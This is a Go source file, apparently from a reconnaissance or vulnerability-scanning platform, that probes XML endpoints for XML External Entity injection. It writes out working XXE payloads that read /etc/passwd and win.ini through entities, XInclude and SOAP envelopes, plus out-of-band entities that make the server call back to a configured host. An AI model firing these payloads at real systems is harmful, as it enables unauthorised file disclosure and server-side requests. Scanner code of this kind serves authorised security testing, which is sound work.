package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

// XXEScanner probes XML-processing endpoints for XML External Entity injection,
// the way it actually manifests in the wild:
//
//   - IN-BAND file read: an external entity resolves file:///etc/passwd (and
//     win.ini) and the parser echoes it into the response. Confirmed by the
//     unmistakable `root:x:0:0:` / `[extensions]` signatures — zero false
//     positives.
//   - OUT-OF-BAND (blind) XXE: when the response reveals nothing, an external
//     entity forces the server to fetch http://<callback>/oob/<token>. The hit
//     lands on the shared OAST endpoint and is raised as a confirmed blind_xxe
//     finding — this catches XXE on parsers that suppress entity output.
//
// It targets endpoints that plausibly consume XML (POST services, XML/JSON
// content-types, SOAP-ish paths) and always sends a correct Content-Type so the
// server routes the body to its XML parser.
type XXEScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewXXEScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *XXEScanner {
	return &XXEScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var xxeClient = newPooledClient(15*time.Second, false)

// In-band signatures that only appear when a file was actually read.
var xxeFileSignatures = []string{"root:x:0:0:", "root:!:0:0:", "[extensions]", "; for 16-bit app support"}

type xxeEndpoint struct {
	URL, Method, ContentType string
}

func (s *XXEScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	endpoints := s.candidateEndpoints(ctx, targetID)
	if len(endpoints) == 0 {
		logFn("info", "xxe", "No XML-capable endpoints to test for XXE")
		return nil
	}
	logFn("info", "xxe", fmt.Sprintf("Testing %d endpoint(s) for XXE (in-band file read + OAST blind)...", len(endpoints)))

	auth := loadAuthHeaders(ctx, s.db, targetID)
	oob, hasOOB := newOOBCapability(s.cfg)

	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, ep := range endpoints {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ep xxeEndpoint) {
			defer wg.Done()
			defer func() { <-sem }()

			// A file signature is proof only when it is absent from independent
			// benign controls. This drops documentation/static error pages that
			// already contain a sample passwd/win.ini fragment.
			controlStatus, control := s.sendXML(ctx, ep, `<root>recon-xxe-control-a</root>`, auth)
			if controlStatus == 0 || looksLikeBlockPage(controlStatus, control) || matchAny(control, xxeFileSignatures) != "" {
				return
			}

			// 1. In-band file read — external entity + XInclude, Unix + Windows.
			for _, target := range []string{"file:///etc/passwd", "file:///c:/windows/win.ini"} {
				for _, payload := range []string{inbandXXEPayload(target), xincludeXXEPayload(target), soapXXEPayload(target)} {
					status, body := s.sendXML(ctx, ep, payload, auth)
					sig := matchAny(body, xxeFileSignatures)
					if status == 0 || sig == "" || looksLikeBlockPage(status, body) {
						continue
					}
					status2, body2 := s.sendXML(ctx, ep, payload, auth)
					controlStatus2, control2 := s.sendXML(ctx, ep, `<root>recon-xxe-control-b</root>`, auth)
					if status2 == 0 || controlStatus2 == 0 || !strings.Contains(body2, sig) ||
						matchAny(control2, xxeFileSignatures) != "" || looksLikeBlockPage(status2, body2) || looksLikeBlockPage(controlStatus2, control2) {
						continue
					}
					ev := fmt.Sprintf("In-band XXE reproduced twice: XML parser read %s and returned %q; signature was absent from two independent control documents", target, sig)
					s.store(targetID, "xxe", "critical", ep, "", payload, ev, 100, 500)
					found.Add(1)
					logFn("warn", "xxe", "XXE (in-band file read): "+ep.URL)
					if s.broadcast != nil {
						s.broadcast("new_vuln_finding", map[string]any{
							"target_id": targetID, "type": "xxe", "url": ep.URL, "parameter": "",
						})
					}
					return // confirmed; no need to keep probing this endpoint
				}
			}

			// 2. Out-of-band blind XXE — only if a callback URL is configured.
			if hasOOB {
				token := registerOOBProbe(s.db, targetID, ep.URL, "", "xxe", "xml-body")
				cb := oob.callbackURL(token)
				for _, payload := range oobXXEPayloads(cb) {
					_, _ = s.sendXML(ctx, ep, payload, auth)
				}
				// Confirmation (if any) arrives asynchronously via /oob/<token>.
			}
		}(ep)
	}
	wg.Wait()
	logFn("info", "xxe", fmt.Sprintf("XXE done. %d in-band finding(s); blind hits report via callback.", found.Load()))
	return nil
}

// candidateEndpoints returns URLs worth sending XML to: alive services (POST is
// tried regardless, since GET endpoints often still parse a posted body) with a
// bias toward XML/SOAP content-types and paths.
func (s *XXEScanner) candidateEndpoints(ctx context.Context, targetID string) []xxeEndpoint {
	seen := map[string]bool{}
	var out []xxeEndpoint
	add := func(ep xxeEndpoint) {
		ep.URL = strings.TrimSpace(ep.URL)
		ep.Method = strings.ToUpper(strings.TrimSpace(ep.Method))
		if ep.Method != "PUT" && ep.Method != "PATCH" && ep.Method != "POST" {
			ep.Method = "POST"
		}
		if ep.ContentType == "" || !strings.Contains(strings.ToLower(ep.ContentType), "xml") {
			ep.ContentType = "application/xml"
		}
		key := ep.Method + " " + ep.URL + " " + strings.ToLower(ep.ContentType)
		if ep.URL != "" && !seen[key] && len(out) < 300 && urlHostInScope(ctx, ep.URL) {
			seen[key] = true
			out = append(out, ep)
		}
	}

	limit := 300
	if s.cfg != nil && s.cfg.URLLimit() > 0 && s.cfg.URLLimit() < limit {
		limit = s.cfg.URLLimit()
	}
	// Probe services with actual XML/SOAP/SAML/import signals. The old query only
	// ORDERED those first but still sent XML to every generic HTML/API service,
	// adding hundreds of requests without meaningful XXE reach.
	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 405
		  AND (content_type LIKE '%xml%' OR url LIKE '%xml%' OR url LIKE '%soap%'
		       OR url LIKE '%rpc%' OR url LIKE '%wsdl%' OR url LIKE '%saml%'
		       OR url LIKE '%upload%' OR url LIKE '%import%' OR url LIKE '%.svg%')
		ORDER BY url
		LIMIT ?`, targetID, limit)
	if err == nil {
		for rows.Next() {
			var u string
			if rows.Scan(&u) == nil {
				add(xxeEndpoint{URL: u, Method: "POST", ContentType: "application/xml"})
			}
		}
		rows.Close()
	}

	// Also any parameter endpoint declaring an XML content-type.
	prows, err := s.db.QueryContext(ctx, `
		SELECT DISTINCT url, COALESCE(method,'POST'), COALESCE(content_type,'application/xml') FROM parameters
		WHERE target_id = ? AND content_type LIKE '%xml%' LIMIT 100`, targetID)
	if err == nil {
		for prows.Next() {
			var ep xxeEndpoint
			if prows.Scan(&ep.URL, &ep.Method, &ep.ContentType) == nil {
				add(ep)
			}
		}
		prows.Close()
	}
	return out
}

func (s *XXEScanner) sendXML(ctx context.Context, ep xxeEndpoint, body string, auth map[string]string) (int, string) {
	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, ep.Method, ep.URL, strings.NewReader(body))
	if err != nil {
		return 0, ""
	}
	req.Header.Set("Content-Type", ep.ContentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := xxeClient.Do(req)
	if err != nil {
		return 0, ""
	}
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return resp.StatusCode, string(out)
}

func (s *XXEScanner) store(targetID, typ, sev string, ep xxeEndpoint, param, payload, evidence string, confidence, priority int) {
	verdict := CandDetected
	if confidence >= ConfEvidence {
		verdict = VerifyVerified
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: typ, Severity: sev, URL: ep.URL, Method: ep.Method,
		Parameter: param, Location: "xml", Payload: truncate(payload, 400), Evidence: evidence,
		Source: "xxe-native", DetectionMethod: "entity-signature", Confidence: confidence,
		Priority: priority, Verdict: verdict,
	})
}

func inbandXXEPayload(fileURI string) string {
	return `<?xml version="1.0"?>` +
		`<!DOCTYPE root [<!ENTITY xxe SYSTEM "` + fileURI + `">]>` +
		`<root>&xxe;</root>`
}

func oobXXEPayload(cb string) string {
	// External general entity that forces an outbound fetch to our callback.
	return `<?xml version="1.0"?>` +
		`<!DOCTYPE root [<!ENTITY xxe SYSTEM "` + cb + `">]>` +
		`<root>&xxe;</root>`
}

func xincludeXXEPayload(fileURI string) string {
	return `<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude">` +
		`<xi:include parse="text" href="` + fileURI + `"/></root>`
}

func soapXXEPayload(fileURI string) string {
	return `<?xml version="1.0"?>` +
		`<!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM "` + fileURI + `">]>` +
		`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">` +
		`<soapenv:Body><recon>&xxe;</recon></soapenv:Body></soapenv:Envelope>`
}

func oobXXEPayloads(cb string) []string {
	return []string{
		oobXXEPayload(cb),
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "` + cb + `">%remote;]><root/>`,
		`<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="` + cb + `"/></root>`,
	}
}

func matchAny(body string, sigs []string) string {
	for _, s := range sigs {
		if strings.Contains(body, s) {
			return s
		}
	}
	return ""
}
